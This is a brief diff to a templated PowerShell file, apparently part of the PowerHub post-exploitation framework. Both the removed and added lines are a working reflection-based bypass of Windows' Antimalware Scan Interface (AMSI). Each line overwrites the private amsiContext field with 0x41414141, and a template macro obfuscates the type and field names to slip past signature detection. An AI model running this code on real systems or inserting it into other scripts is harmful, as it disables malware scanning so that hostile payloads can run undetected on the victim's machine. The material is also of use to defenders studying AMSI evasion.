+++ powerhub/templates/powershell/amsi/reflection2.ps1
@@ -1,3 +1,3 @@
 {% from 'macros.jinja2' import obfuscate with context%}
 
-[Runtime.InteropServices.Marshal]::WriteInt32([Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}.Invoke({{obfuscate("System.Management.Automation.AmsiUtils")}}).GetField({{obfuscate("amsiContext")}},[Reflection.BindingFlags]{{obfuscate("NonPublic,Static")}}).{{obfuscate("GetValue")}}.Invoke($null),0x41414141);
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].{{obfuscate("Assembly")}}.GetType({{obfuscate('System.Management.Automation.AmsiUtils')}}).GetField({{obfuscate('amsiContext')}},[Reflection.BindingFlags]{{obfuscate('NonPublic,Static')}}).GetValue($null),[int]{{obfuscate("0x41414141")}});